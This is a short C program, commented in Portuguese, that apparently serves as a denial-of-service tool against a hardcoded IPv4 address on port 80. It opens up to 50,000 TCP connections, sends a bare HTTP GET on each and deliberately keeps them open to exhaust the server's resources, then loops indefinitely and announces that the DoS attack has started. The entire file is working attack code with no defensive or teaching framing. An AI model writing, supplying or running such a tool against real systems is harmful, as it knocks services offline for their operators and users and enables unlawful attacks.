#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define TARGET_IP "37.59.174.225"
#define TARGET_PORT 80
#define NUM_CONNECTIONS 50000

int main() {
    int sockfd;
    struct sockaddr_in target_addr;
    char *buffer = "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n";

    // Criando várias conex�es simultâneas
    for (int i = 0; i < NUM_CONNECTIONS; i++) {
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            perror("Erro ao criar socket");
            exit(1);
        }

        memset(&target_addr, 0, sizeof(target_addr));
        target_addr.sin_family = AF_INET;
        target_addr.sin_addr.s_addr = inet_addr(TARGET_IP);
        target_addr.sin_port = htons(TARGET_PORT);

        if (connect(sockfd, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
            perror("Erro ao conectar");
            close(sockfd);
            continue;
        }

        send(sockfd, buffer, strlen(buffer), 0);

        // Não fecha a conexão, deixando o servidor sem recursos
    }

    printf("Ataque DoS iniciado. Pressione Ctrl+C para interromper.\n");

    // Loop infinito para manter as conex�es abertas
    while (1) {
        sleep(1);
    }

    return 0;
}
